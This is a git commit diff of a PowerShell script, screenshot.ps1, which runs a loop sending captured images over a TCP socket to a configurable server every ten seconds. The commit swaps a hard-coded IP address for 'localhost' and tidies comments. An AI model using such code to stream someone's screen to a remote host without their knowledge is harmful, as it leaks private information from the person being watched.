031829a63325e0b2df08968e523aa88c3873edb4
jeremysam3 <31583597+jeremysam3@users.noreply.github.com>
2020-08-18 12:48:09 +0530

    Update screenshot.ps1

--- screenshot.ps1
+++ screenshot.ps1
@@ -1,4 +1,4 @@
-#$FTPServer = "35.200.251.56"
+#replace localhost with IP address
 $FTPServer = "localhost"
 $FTPPort = "5000"
 
@@ -21,22 +21,23 @@ while ($connection.Connected) {
     #print
     Write-Host -NoNewline 'image ' $counter size:  $msg.Length $image.Size
 
-    #send size of image
-    $header = $msg.Length
-    $hbytes = $EncodedText.GetBytes($header)
-    $stream.Write($hbytes,0,$hbytes.Length)
+    #size of image
+    $header = $EncodedText.GetBytes($msg.Length)
+    #send
+    $stream.Write($header,0,$header.Length)
+    
     #end of stream
     $end = $EncodedText.GetBytes('&')
-
     #send
     $stream.Write($end,0,$end.Length)
+    
     sleep(1)
-   # sleep 20
-
-   $send msg
+    #sleep 20
+    
+    #send msg
     $stream.Write($msg,0,$msg.Length)
     $stream.Flush()
 
     $counter = $counter + 1;
-	sleep 10
+    sleep 10
 }
